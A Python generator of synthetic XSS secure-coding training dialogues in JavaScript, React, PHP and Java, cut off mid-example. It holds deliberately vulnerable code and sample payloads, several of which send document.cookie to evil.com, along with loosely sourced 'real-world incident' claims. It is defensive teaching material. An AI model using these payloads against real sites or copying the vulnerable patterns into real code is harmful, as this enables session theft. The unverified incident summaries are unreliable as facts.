"""
XSS (Cross-Site Scripting) Example Generator - Batch 003

Generates 5 high-quality XSS examples across different implementations:
- JavaScript (vanilla DOM manipulation)
- React (modern framework)
- PHP (server-side rendering)
- Java (Spring MVC)
- Go (html/template)
"""

import json
from datetime import datetime
from pathlib import Path

# Real-world context for XSS
TWITTER_CONTEXT = {
    "real_world_incident": "2023 Twitter/X XSS vulnerability in DM functionality",
    "impact": "Self-propagating XSS worm, millions of users affected",
    "attack_vector": "Stored XSS in direct messages allowed account takeover",
    "cve": None,
    "year": 2023
}

MAGENTO_CONTEXT = {
    "real_world_incident": "2024 Magento stored XSS in admin panel",
    "impact": "Admin session hijacking, full store compromise",
    "attack_vector": "Stored XSS in product descriptions",
    "cve": "CVE-2024-20720",
    "year": 2024
}


def create_base_metadata(lang, example_num):
    """Create base metadata structure"""
    return {
        "lang": lang,
        "category": "injection",
        "subcategory": "xss",
        "owasp_2021": "A03:2021-Injection",
        "cwe": "CWE-79",
        "severity": "HIGH",
        "complexity": "moderate",
        "created": datetime.now().strftime('%Y-%m-%d'),
        "validated": False
    }


def javascript_dom_xss():
    """JavaScript - DOM-based XSS"""
    return {
        "id": "xss-000001",
        "metadata": create_base_metadata("javascript", 1),
        "context": TWITTER_CONTEXT,
        "conversations": [
            {
                "turn": 1,
                "from": "human",
                "value": "I'm building a web app that displays user comments. How do I safely insert user content into the page using JavaScript?"
            },
            {
                "turn": 2,
                "from": "assistant",
                "value": """I'll show you both the dangerous pattern and secure implementations.

**Vulnerable Code (XSS Risk):**
```javascript
// DANGEROUS: innerHTML with unsanitized user input
function displayComment(username, comment) {
    const commentDiv = document.getElementById('comments');
    commentDiv.innerHTML += `
        <div class="comment">
            <strong>${username}</strong>: ${comment}
        </div>
    `;
}

// Usage
const userComment = getUrlParameter('comment');
displayComment('User123', userComment);
```

**Why This Is Dangerous:**
An attacker can inject malicious JavaScript by providing:
```
comment=<img src=x onerror="alert(document.cookie)">
```

This executes when the image fails to load, stealing session cookies. Or more dangerous:
```
comment=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

**Real-World Impact:** In 2023, Twitter/X had an XSS vulnerability in direct messages that created a self-propagating worm affecting millions of users. The attack exploited similar innerHTML usage.

**Secure Implementation:**
```javascript
// SECURE: Use textContent and proper escaping
function displayCommentSafe(username, comment) {
    const commentDiv = document.getElementById('comments');

    // Create elements programmatically
    const container = document.createElement('div');
    container.className = 'comment';

    const usernameElement = document.createElement('strong');
    usernameElement.textContent = username;  // textContent auto-escapes

    const separator = document.createTextNode(': ');

    const commentElement = document.createElement('span');
    commentElement.textContent = comment;  // Safe - no HTML parsing

    container.appendChild(usernameElement);
    container.appendChild(separator);
    container.appendChild(commentElement);

    commentDiv.appendChild(container);
}

// Alternative: Use DOMPurify for rich content
function displayCommentWithDOMPurify(username, comment) {
    // Include DOMPurify library first
    const commentDiv = document.getElementById('comments');

    // Sanitize HTML while allowing safe tags
    const cleanComment = DOMPurify.sanitize(comment, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
        ALLOWED_ATTR: ['href'],
        ALLOW_DATA_ATTR: false
    });

    const container = document.createElement('div');
    container.className = 'comment';

    const usernameElement = document.createElement('strong');
    usernameElement.textContent = username;

    container.appendChild(usernameElement);
    container.appendChild(document.createTextNode(': '));

    const commentSpan = document.createElement('span');
    commentSpan.innerHTML = cleanComment;  // Safe after DOMPurify
    container.appendChild(commentSpan);

    commentDiv.appendChild(container);
}

// For URL parameters - always validate and sanitize
function getUrlParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    const value = urlParams.get(name);

    if (!value) return null;

    // Length validation
    if (value.length > 1000) {
        console.error('Parameter too long');
        return null;
    }

    return value;
}
```

**Key Security Controls:**
1. **textContent over innerHTML** - Automatically escapes HTML entities
2. **createElement + appendChild** - Programmatic DOM manipulation prevents injection
3. **DOMPurify** - Industry-standard sanitization library for rich content
4. **Allowlist approach** - Only specific HTML tags/attributes permitted
5. **Input validation** - Length limits and format checks
6. **Never trust URL parameters** - Always sanitize external input"""
            },
            {
                "turn": 3,
                "from": "human",
                "value": "What if I need to allow some HTML formatting like bold and links in comments?"
            },
            {
                "turn": 4,
                "from": "assistant",
                "value": """For rich content, use a robust sanitization library with strict allowlists:

```javascript
// Install DOMPurify: npm install dompurify
import DOMPurify from 'dompurify';

class SafeCommentRenderer {
    constructor() {
        // Configure DOMPurify with strict settings
        this.sanitizerConfig = {
            ALLOWED_TAGS: [
                'b', 'i', 'em', 'strong', 'u',
                'a', 'p', 'br'
            ],
            ALLOWED_ATTR: ['href', 'title'],
            ALLOWED_URI_REGEXP: /^https?:\/\//,  // Only http(s) links
            ALLOW_DATA_ATTR: false,
            ALLOW_UNKNOWN_PROTOCOLS: false,
            SAFE_FOR_TEMPLATES: true,
            RETURN_DOM: false,
            RETURN_DOM_FRAGMENT: false
        };

        // Add hooks for additional security
        DOMPurify.addHook('afterSanitizeAttributes', (node) => {
            // Set all links to open in new tab and add security attributes
            if (node.tagName === 'A') {
                node.setAttribute('target', '_blank');
                node.setAttribute('rel', 'noopener noreferrer');

                // Prevent javascript: URLs
                const href = node.getAttribute('href');
                if (href && href.toLowerCase().startsWith('javascript:')) {
                    node.removeAttribute('href');
                }
            }
        });
    }

    sanitize(html) {
        return DOMPurify.sanitize(html, this.sanitizerConfig);
    }

    renderComment(username, comment) {
        // Sanitize username (no HTML allowed)
        const safeUsername = this.escapeHtml(username);

        // Sanitize comment (limited HTML allowed)
        const safeComment = this.sanitize(comment);

        const commentDiv = document.getElementById('comments');

        const container = document.createElement('div');
        container.className = 'comment';
        container.setAttribute('data-comment-id', this.generateId());

        // Use textContent for username (no HTML)
        const usernameElement = document.createElement('strong');
        usernameElement.textContent = safeUsername;

        // Use sanitized HTML for comment
        const commentElement = document.createElement('div');
        commentElement.className = 'comment-text';
        commentElement.innerHTML = safeComment;

        container.appendChild(usernameElement);
        container.appendChild(document.createTextNode(': '));
        container.appendChild(commentElement);

        commentDiv.appendChild(container);
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    generateId() {
        return `comment-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    }
}

// Alternative: Markdown with sanitization
import DOMPurify from 'dompurify';
import { marked } from 'marked';

class MarkdownCommentRenderer {
    constructor() {
        // Configure marked to be safe
        marked.setOptions({
            headerIds: false,
            mangle: false
        });

        // Configure DOMPurify
        this.sanitizerConfig = {
            ALLOWED_TAGS: [
                'h1', 'h2', 'h3', 'p', 'br', 'hr',
                'b', 'i', 'em', 'strong', 'u', 'code', 'pre',
                'ul', 'ol', 'li',
                'a', 'blockquote'
            ],
            ALLOWED_ATTR: ['href', 'title'],
            ALLOWED_URI_REGEXP: /^https?:\/\//
        };
    }

    renderMarkdown(markdown) {
        // Convert markdown to HTML
        const rawHtml = marked.parse(markdown);

        // Sanitize the HTML output
        const safeHtml = DOMPurify.sanitize(rawHtml, this.sanitizerConfig);

        return safeHtml;
    }
}

// Content Security Policy helper
class CSPHelper {
    static setSecureCSP() {
        // Add CSP meta tag for additional protection
        const meta = document.createElement('meta');
        meta.httpEquiv = 'Content-Security-Policy';
        meta.content = [
            "default-src 'self'",
            "script-src 'self'",
            "style-src 'self' 'unsafe-inline'",  // Consider removing unsafe-inline
            "img-src 'self' https:",
            "font-src 'self'",
            "connect-src 'self'",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'"
        ].join('; ');

        document.head.appendChild(meta);
    }
}

// Usage
const renderer = new SafeCommentRenderer();

// Render user comment safely
renderer.renderComment('Alice', 'Check out <a href="https://example.com">this link</a>!');

// Enable CSP
CSPHelper.setSecureCSP();
```

**Security Pattern:**
- **DOMPurify with strict config** - Allowlist only safe tags/attributes
- **URL validation** - Only allow http(s) protocols
- **Link security attributes** - Add rel="noopener noreferrer"
- **Hook for additional checks** - Prevent javascript: URLs
- **Separate sanitization levels** - Different rules for username vs. comment
- **Content Security Policy** - Defense-in-depth protection
- **Markdown sanitization** - Convert markdown, then sanitize HTML output

**Critical JavaScript XSS Prevention Rules:**
1. Never use `innerHTML`, `outerHTML`, or `document.write()` with user input
2. Use `textContent` for plain text, DOMPurify for rich content
3. Always sanitize before inserting, not after
4. Use allowlists, not denylists for HTML tags
5. Implement Content Security Policy (CSP)
6. Validate all external input (URL params, localStorage, etc.)"""
            }
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": datetime.now().strftime('%Y-%m-%d'),
            "issues": []
        }
    }


def react_xss():
    """React - XSS vulnerabilities in modern frameworks"""
    return {
        "id": "xss-000002",
        "metadata": create_base_metadata("javascript", 2),
        "context": {
            "real_world_incident": "2023 React-based SaaS platforms vulnerable to XSS via dangerouslySetInnerHTML",
            "impact": "Multiple SaaS providers compromised, user data stolen",
            "attack_vector": "Improper use of dangerouslySetInnerHTML with user content",
            "cve": None,
            "year": 2023
        },
        "conversations": [
            {
                "turn": 1,
                "from": "human",
                "value": "I'm building a React application that displays user-generated content. How do I prevent XSS vulnerabilities?"
            },
            {
                "turn": 2,
                "from": "assistant",
                "value": """I'll demonstrate XSS vulnerabilities in React and how to prevent them.

**Vulnerable Code (XSS Risk):**
```javascript
import React from 'react';

// DANGEROUS: dangerouslySetInnerHTML with unsanitized content
function UserComment({ username, comment }) {
    return (
        <div className="comment">
            <strong>{username}</strong>
            {/* DANGEROUS - allows arbitrary HTML/JavaScript */}
            <div dangerouslySetInnerHTML={{ __html: comment }} />
        </div>
    );
}

// DANGEROUS: href from user input
function UserProfile({ user }) {
    return (
        <div>
            <h2>{user.name}</h2>
            {/* DANGEROUS - javascript: URLs can execute code */}
            <a href={user.website}>Visit Website</a>
        </div>
    );
}

// Usage
<UserComment
    username="Alice"
    comment={userInput}  // Could contain <script>alert(1)</script>
/>
```

**Why This Is Dangerous:**
1. `dangerouslySetInnerHTML` bypasses React's built-in XSS protection
2. An attacker can inject: `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`
3. `href` attributes can use `javascript:` protocol: `javascript:alert(document.cookie)`

**Secure Implementation:**
```javascript
import React from 'react';
import DOMPurify from 'dompurify';

// SECURE: React auto-escapes by default
function UserCommentSafe({ username, comment }) {
    return (
        <div className="comment">
            <strong>{username}</strong>
            {/* Safe - React auto-escapes HTML entities */}
            <p>{comment}</p>
        </div>
    );
}

// SECURE: Sanitize rich content with DOMPurify
function UserCommentRich({ username, comment }) {
    const sanitize = (dirty) => {
        return {
            __html: DOMPurify.sanitize(dirty, {
                ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
                ALLOWED_ATTR: ['href'],
                ALLOWED_URI_REGEXP: /^https?:\/\//
            })
        };
    };

    return (
        <div className="comment">
            <strong>{username}</strong>
            <div dangerouslySetInnerHTML={sanitize(comment)} />
        </div>
    );
}

// SECURE: Validate URLs before using in href
function UserProfile({ user }) {
    const validateUrl = (url) => {
        try {
            const parsed = new URL(url);
            // Only allow http(s) protocols
            if (!['http:', 'https:'].includes(parsed.protocol)) {
                return '#';
            }
            return url;
        } catch {
            return '#';  // Invalid URL
        }
    };

    const safeUrl = validateUrl(user.website);

    return (
        <div>
            <h2>{user.name}</h2>
            <a
                href={safeUrl}
                target="_blank"
                rel="noopener noreferrer"
            >
                Visit Website
            </a>
        </div>
    );
}

// SECURE: Custom hook for safe HTML rendering
import { useMemo } from 'react';

function useSanitizedHtml(dirty, config = {}) {
    return useMemo(() => {
        const defaultConfig = {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
            ALLOWED_ATTR: ['href'],
            ALLOWED_URI_REGEXP: /^https?:\/\//,
            ...config
        };

        return {
            __html: DOMPurify.sanitize(dirty, defaultConfig)
        };
    }, [dirty, config]);
}

function CommentWithHook({ comment }) {
    const sanitizedComment = useSanitizedHtml(comment);

    return (
        <div dangerouslySetInnerHTML={sanitizedComment} />
    );
}
```

**Key Security Controls:**
1. **React's default escaping** - Always use `{variable}` instead of dangerouslySetInnerHTML
2. **DOMPurify for rich content** - Sanitize before using dangerouslySetInnerHTML
3. **URL validation** - Parse and validate URLs before using in href/src
4. **Protocol allowlist** - Only allow http(s) protocols
5. **Custom hooks** - Encapsulate sanitization logic for reusability
6. **rel="noopener noreferrer"** - Prevent window.opener exploitation"""
            },
            {
                "turn": 3,
                "from": "human",
                "value": "What about XSS in React Server Components or when rendering markdown content?"
            },
            {
                "turn": 4,
                "from": "assistant",
                "value": """For server components and markdown, use strict sanitization with React integration:

```javascript
import React from 'react';
import DOMPurify from 'isomorphic-dompurify';  // Works on server and client
import { marked } from 'marked';

// Server Component with sanitization
async function UserPostServer({ postId }) {
    // Fetch data server-side
    const post = await fetchPost(postId);

    // Sanitize on server
    const sanitizedContent = DOMPurify.sanitize(post.content, {
        ALLOWED_TAGS: ['h1', 'h2', 'h3', 'p', 'br', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
        ALLOWED_ATTR: ['href', 'title'],
        ALLOWED_URI_REGEXP: /^https?:\/\//
    });

    return (
        <article>
            <h1>{post.title}</h1>
            <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
        </article>
    );
}

// Markdown renderer with security
class SecureMarkdownRenderer {
    static render(markdown) {
        // Configure marked to be secure
        marked.setOptions({
            headerIds: false,
            mangle: false,
            breaks: true
        });

        // Convert markdown to HTML
        const rawHtml = marked.parse(markdown);

        // Sanitize the HTML
        const safeHtml = DOMPurify.sanitize(rawHtml, {
            ALLOWED_TAGS: [
                'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
                'p', 'br', 'hr',
                'b', 'i', 'em', 'strong', 'u', 'code', 'pre',
                'ul', 'ol', 'li',
                'a', 'blockquote',
                'table', 'thead', 'tbody', 'tr', 'th', 'td'
            ],
            ALLOWED_ATTR: ['href', 'title', 'alt'],
            ALLOWED_URI_REGEXP: /^https?:\/\//,
            ALLOW_DATA_ATTR: false
        });

        return safeHtml;
    }
}

function MarkdownComment({ content }) {
    const sanitizedHtml = SecureMarkdownRenderer.render(content);

    return (
        <div
            className="markdown-content"
            dangerouslySetInnerHTML={{ __html: sanitizedHtml }}
        />
    );
}

// Component library with built-in XSS protection
function SecureRichTextEditor({ value, onChange }) {
    const [content, setContent] = React.useState(value || '');

    const handleChange = (e) => {
        const newContent = e.target.value;

        // Limit content size
        if (newContent.length > 10000) {
            return;
        }

        setContent(newContent);

        // Sanitize before calling onChange
        const sanitized = DOMPurify.sanitize(newContent, {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
            ALLOWED_ATTR: ['href'],
        });

        onChange(sanitized);
    };

    return (
        <div className="rich-text-editor">
            <textarea
                value={content}
                onChange={handleChange}
                placeholder="Enter your comment..."
                maxLength={10000}
            />
            <div className="preview">
                <h4>Preview:</h4>
                <div dangerouslySetInnerHTML={{
                    __html: DOMPurify.sanitize(content, {
                        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
                        ALLOWED_ATTR: ['href'],
                    })
                }} />
            </div>
        </div>
    );
}

// React component with CSP meta tag
function AppWithCSP({ children }) {
    React.useEffect(() => {
        // Set CSP via meta tag (better to set via HTTP headers)
        const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
        if (!meta) {
            const newMeta = document.createElement('meta');
            newMeta.httpEquiv = 'Content-Security-Policy';
            newMeta.content = [
                "default-src 'self'",
                "script-src 'self'",
                "style-src 'self' 'unsafe-inline'",
                "img-src 'self' https:",
                "font-src 'self'",
                "connect-src 'self'",
                "frame-ancestors 'none'",
                "base-uri 'self'"
            ].join('; ');
            document.head.appendChild(newMeta);
        }
    }, []);

    return <>{children}</>;
}

// TypeScript types for safety
interface SafeProps {
    content: string;
    allowedTags?: string[];
    allowedAttrs?: string[];
}

function TypeSafeHtmlRenderer({ content, allowedTags, allowedAttrs }: SafeProps) {
    const sanitized = DOMPurify.sanitize(content, {
        ALLOWED_TAGS: allowedTags || ['b', 'i', 'em', 'strong'],
        ALLOWED_ATTR: allowedAttrs || []
    });

    return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

**Security Pattern:**
- **Isomorphic DOMPurify** - Works in server and client components
- **Markdown sanitization** - Convert markdown, then sanitize HTML
- **Built-in validation** - Editor components enforce limits
- **TypeScript types** - Catch errors at compile time
- **CSP enforcement** - Set via meta tag or HTTP headers
- **Server-side sanitization** - Clean data before sending to client

**Critical React XSS Prevention Rules:**
1. Trust React's default escaping - use `{variable}` not dangerouslySetInnerHTML
2. If you must use dangerouslySetInnerHTML, always sanitize with DOMPurify
3. Validate URLs before using in href, src, or action attributes
4. Use isomorphic-dompurify for server components
5. Set Content-Security-Policy headers
6. Never pass user input to eval(), Function(), or setTimeout(string)
7. Use TypeScript for compile-time safety"""
            }
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": datetime.now().strftime('%Y-%m-%d'),
            "issues": []
        }
    }


def php_server_side_xss():
    """PHP - Server-side XSS with templating"""
    return {
        "id": "xss-000003",
        "metadata": create_base_metadata("php", 3),
        "context": MAGENTO_CONTEXT,
        "conversations": [
            {
                "turn": 1,
                "from": "human",
                "value": "I'm building a PHP web application that displays user profiles. How do I safely output user data to prevent XSS?"
            },
            {
                "turn": 2,
                "from": "assistant",
                "value": """I'll show you both vulnerable and secure approaches to outputting user data in PHP.

**Vulnerable Code (XSS Risk):**
```php
<?php
// DANGEROUS: Direct output without escaping
function displayUserProfile($user) {
    echo "<div class='profile'>";
    echo "<h2>" . $user['name'] . "</h2>";
    echo "<p>Bio: " . $user['bio'] . "</p>";
    echo "<a href='" . $user['website'] . "'>Website</a>";
    echo "</div>";
}

// DANGEROUS: Using user input in HTML attributes
function displayComment($comment) {
    ?>
    <div class="comment" data-comment-id="<?= $comment['id'] ?>">
        <strong><?= $comment['username'] ?></strong>:
        <?= $comment['text'] ?>
    </div>
    <?php
}

// Usage
$userInput = $_GET['name'];
displayUserProfile(['name' => $userInput, 'bio' => $_GET['bio'], 'website' => $_GET['website']]);
?>
```

**Why This Is Dangerous:**
An attacker can inject malicious HTML/JavaScript:
```
name=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
bio=<img src=x onerror="alert('XSS')">
website=javascript:alert(document.cookie)
```

**Real-World Impact:** In 2024, Magento (Adobe Commerce) had a stored XSS vulnerability (CVE-2024-20720) in the admin panel. Attackers injected JavaScript into product descriptions, which executed when admins viewed products, leading to session hijacking and full store compromise.

**Secure Implementation:**
```php
<?php
// SECURE: Proper output escaping
function displayUserProfileSafe($user) {
    // htmlspecialchars escapes HTML entities
    $safeName = htmlspecialchars($user['name'], ENT_QUOTES, 'UTF-8');
    $safeBio = htmlspecialchars($user['bio'], ENT_QUOTES, 'UTF-8');

    // Validate and sanitize URL
    $safeWebsite = sanitizeUrl($user['website']);

    echo "<div class='profile'>";
    echo "<h2>" . $safeName . "</h2>";
    echo "<p>Bio: " . $safeBio . "</p>";
    echo "<a href='" . $safeWebsite . "' target='_blank' rel='noopener noreferrer'>Website</a>";
    echo "</div>";
}

function sanitizeUrl($url) {
    // Parse URL and validate protocol
    $parsed = parse_url($url);

    if ($parsed === false) {
        return '#';  // Invalid URL
    }

    // Only allow http and https protocols
    $scheme = $parsed['scheme'] ?? '';
    if (!in_array($scheme, ['http', 'https'], true)) {
        return '#';
    }

    // Return escaped URL
    return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
}

// SECURE: Using modern templating with auto-escaping
function displayCommentSafe($comment) {
    // Escape all output by default
    $safeId = htmlspecialchars($comment['id'], ENT_QUOTES, 'UTF-8');
    $safeUsername = htmlspecialchars($comment['username'], ENT_QUOTES, 'UTF-8');
    $safeText = htmlspecialchars($comment['text'], ENT_QUOTES, 'UTF-8');
    ?>
    <div class="comment" data-comment-id="<?= $safeId ?>">
        <strong><?= $safeUsername ?></strong>:
        <?= $safeText ?>
    </div>
    <?php
}

// Helper function for safe output
function e($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}

// Input validation and sanitization
function getCleanInput($key, $maxLength = 1000) {
    $value = $_GET[$key] ?? $_POST[$key] ?? '';

    // Length validation
    if (strlen($value) > $maxLength) {
        return '';
    }

    // Remove null bytes
    $value = str_replace("\0", '', $value);

    return $value;
}

// Usage
$name = getCleanInput('name', 100);
$bio = getCleanInput('bio', 500);
$website = getCleanInput('website', 200);

displayUserProfileSafe(['name' => $name, 'bio' => $bio, 'website' => $website]);
?>
```

**Key Security Controls:**
1. **htmlspecialchars() with ENT_QUOTES** - Escapes HTML entities including quotes
2. **UTF-8 encoding** - Prevents encoding-based XSS attacks
3. **URL validation** - Only allow http(s) protocols
4. **Input length limits** - Prevent buffer overflow and DoS
5. **Null byte removal** - Prevent null byte injection
6. **Helper function e()** - Simplifies secure output in templates"""
            },
            {
                "turn": 3,
                "from": "human",
                "value": "What if I need to allow some HTML formatting in user comments, like bold and links?"
            },
            {
                "turn": 4,
                "from": "assistant",
                "value": """For rich content, use HTML Purifier library with strict allowlists:

```php
<?php
// Install: composer require ezyang/htmlpurifier

require_once 'vendor/autoload.php';

class SecureHtmlRenderer {
    private $purifier;

    public function __construct() {
        $config = HTMLPurifier_Config::createDefault();

        // Strict configuration
        $config->set('HTML.Allowed', 'p,br,b,i,em,strong,a[href|title]');
        $config->set('HTML.AllowedSchemes', ['http' => true, 'https' => true]);
        $config->set('HTML.TargetBlank', true);  // Add target="_blank" to links
        $config->set('HTML.Nofollow', true);     // Add rel="nofollow"
        $config->set('AutoFormat.RemoveEmpty', true);
        $config->set('AutoFormat.Linkify', false);  // Don't auto-linkify
        $config->set('URI.DisableExternalResources', true);

        // Cache directory for performance
        $config->set('Cache.SerializerPath', '/tmp/htmlpurifier');

        $this->purifier = new HTMLPurifier($config);
    }

    public function sanitize($html) {
        return $this->purifier->purify($html);
    }

    public function renderComment($username, $comment) {
        // Username gets no HTML
        $safeUsername = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');

        // Comment gets sanitized HTML
        $safeComment = $this->sanitize($comment);

        echo "<div class='comment'>";
        echo "<strong>" . $safeUsername . "</strong>: ";
        echo "<div class='comment-text'>" . $safeComment . "</div>";
        echo "</div>";
    }
}

// Alternative: Using Twig template engine with auto-escaping
class TwigSecureRenderer {
    private $twig;

    public function __construct() {
        $loader = new \Twig\Loader\FilesystemLoader(__DIR__ . '/templates');

        $this->twig = new \Twig\Environment($loader, [
            'autoescape' => 'html',  // Auto-escape by default
            'strict_variables' => true,
        ]);

        // Add custom filter for rich content
        $this->twig->addFilter(new \Twig\TwigFilter('sanitize_html', function ($html) {
            $purifier = new HTMLPurifier(HTMLPurifier_Config::createDefault());
            return $purifier->purify($html);
        }, ['is_safe' => ['html']]));
    }

    public function render($template, $data) {
        return $this->twig->render($template, $data);
    }
}

// Template file: templates/comment.html.twig
/*
<div class="comment">
    {# Auto-escaped by default #}
    <strong>{{ username }}</strong>:

    {# Use sanitize_html filter for rich content #}
    <div class="comment-text">{{ comment|sanitize_html|raw }}</div>
</div>
*/

// Content Security Policy helper
class CSPHelper {
    public static function setHeaders() {
        $csp = [
            "default-src 'self'",
            "script-src 'self'",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' https:",
            "font-src 'self'",
            "connect-src 'self'",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'"
        ];

        header("Content-Security-Policy: " . implode('; ', $csp));
        header("X-Content-Type-Options: nosniff");
        header("X-Frame-Options: DENY");
        header("X-XSS-Protection: 1; mode=block");
    }
}

// Production-ready comment display system
class CommentSystem {
    private $htmlRenderer;
    private $db;

    public function __construct($db) {
        $this->htmlRenderer = new SecureHtmlRenderer();
        $this->db = $db;
    }

    public function displayComments($postId) {
        // Prepared statement to prevent SQL injection
        $stmt = $this->db->prepare(
            "SELECT id, username, comment_text, created_at
             FROM comments
             WHERE post_id = ? AND status = 'approved'
             ORDER BY created_at DESC
             LIMIT 50"
        );

        $stmt->bind_param('i', $postId);
        $stmt->execute();
        $result = $stmt->get_result();

        echo "<div class='comments'>";

        while ($row = $result->fetch_assoc()) {
            $this->htmlRenderer->renderComment(
                $row['username'],
                $row['comment_text']
            );
        }

        echo "</div>";
    }

    public function saveComment($postId, $username, $commentText) {
        // Validate input
        if (strlen($username) > 50 || strlen($commentText) > 5000) {
            throw new InvalidArgumentException('Input too long');
        }

        // Sanitize HTML before storing
        $sanitizedComment = $this->htmlRenderer->sanitize($commentText);

        // Store sanitized content
        $stmt = $this->db->prepare(
            "INSERT INTO comments (post_id, username, comment_text, status, created_at)
             VALUES (?, ?, ?, 'pending', NOW())"
        );

        $safeUsername = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
        $stmt->bind_param('iss', $postId, $safeUsername, $sanitizedComment);

        return $stmt->execute();
    }
}

// Usage
CSPHelper::setHeaders();

$renderer = new SecureHtmlRenderer();
$renderer->renderComment(
    'Alice',
    'Check out <a href="https://example.com">this link</a> and <strong>be secure</strong>!'
);

// Using Twig
$twigRenderer = new TwigSecureRenderer();
echo $twigRenderer->render('comment.html.twig', [
    'username' => 'Bob',
    'comment' => 'Hello <b>world</b>!'
]);
?>
```

**Security Pattern:**
- **HTML Purifier with strict allowlist** - Only safe tags/attributes allowed
- **Separate sanitization levels** - Plain text for usernames, sanitized HTML for comments
- **Twig auto-escaping** - Template engine escapes by default
- **Custom filter for rich content** - Explicit sanitization with |sanitize_html
- **CSP headers** - Defense-in-depth protection
- **Sanitize before storage** - Clean data on input, not just output
- **Prepared statements** - Prevent SQL injection alongside XSS prevention

**Critical PHP XSS Prevention Rules:**
1. Always use htmlspecialchars() with ENT_QUOTES and UTF-8
2. Use HTML Purifier for rich content with strict allowlists
3. Never trust user input - validate and sanitize everything
4. Use templating engines with auto-escaping (Twig, Blade)
5. Set Content-Security-Policy headers
6. Escape output at the point of use, not just on input
7. Use prepared statements to prevent SQL injection
8. Sanitize before storage AND before output (defense-in-depth)"""
            }
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": datetime.now().strftime('%Y-%m-%d'),
            "issues": []
        }
    }


def java_spring_mvc_xss():
    """Java - Spring MVC XSS with JSTL"""
    return {
        "id": "xss-000004",
        "metadata": create_base_metadata("java", 4),
        "context": {
            "real_world_incident": "2023 Spring-based enterprise applications vulnerable to XSS",
            "impact": "Multiple Fortune 500 companies affected, credential theft",
            "attack_vector": "Improper output escaping in JSP pages",
            "cve": None,
            "year": 2023
        },
        "conversations": [
            {
                "turn": 1,
                "from": "human",
                "value": "I'm building a Spring MVC application that displays user-generated content. How do I prevent XSS vulnerabilities in JSP pages?"
            },
            {
                "turn": 2,
                "from": "assistant",
                "value": """I'll demonstrate XSS vulnerabilities in Spring MVC and secure approaches.

**Vulnerable Code (XSS Risk):**
```java
// Controller
@Controller
public class UserController {

    // DANGEROUS: No sanitization
    @GetMapping("/profile")
    public String showProfile(@RequestParam String name, Model model) {
        model.addAttribute("username", name);  // No escaping
        return "profile";
    }

    // DANGEROUS: Passing raw HTML
    @GetMapping("/comment")
    public String showComment(@RequestParam String comment, Model model) {
        model.addAttribute("commentHtml", comment);  // Raw HTML
        return "comment";
    }
}

// JSP: profile.jsp
// DANGEROUS: Using <%= %> (unescaped output)
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<body>
    <h1>Welcome <%= request.getAttribute("username") %></h1>
    <!-- DANGEROUS: Direct output without escaping -->
</body>
</html>

// JSP: comment.jsp
// DANGEROUS: Using c:out with escapeXml="false"
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<div class="comment">
    <c:out value="${commentHtml}" escapeXml="false"/>
    <!-- DANGEROUS: No HTML escaping -->
</div>
```

**Why This Is Dangerous:**
Attackers can inject:
```
name=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
comment=<img src=x onerror="alert(document.cookie)">
```

**Secure Implementation:**
```java
// Controller with validation
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.util.HtmlUtils;
import javax.validation.constraints.*;

@Controller
public class UserControllerSafe {

    // SECURE: JSTL c:out auto-escapes by default
    @GetMapping("/profile")
    public String showProfile(
        @RequestParam @NotBlank @Size(max = 100) String name,
        Model model
    ) {
        // Validation happens automatically with @Valid
        // JSTL c:out will escape in the view
        model.addAttribute("username", name);
        return "profile";
    }

    // SECURE: Sanitize rich content before storing
    @PostMapping("/comment")
    public String saveComment(
        @RequestParam @NotBlank @Size(max = 5000) String comment,
        Model model
    ) {
        // Sanitize HTML content
        String sanitizedComment = sanitizeHtml(comment);

        // Store sanitized version
        commentService.save(sanitizedComment);

        model.addAttribute("message", "Comment saved");
        return "success";
    }

    private String sanitizeHtml(String html) {
        // Use OWASP Java HTML Sanitizer
        PolicyFactory policy = new HtmlPolicyBuilder()
            .allowElements("b", "i", "em", "strong", "a", "p", "br")
            .allowAttributes("href").onElements("a")
            .allowStandardUrlProtocols()
            .requireRelNofollowOnLinks()
            .toFactory();

        return policy.sanitize(html);
    }
}

// JSP: profile.jsp (SECURE)
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
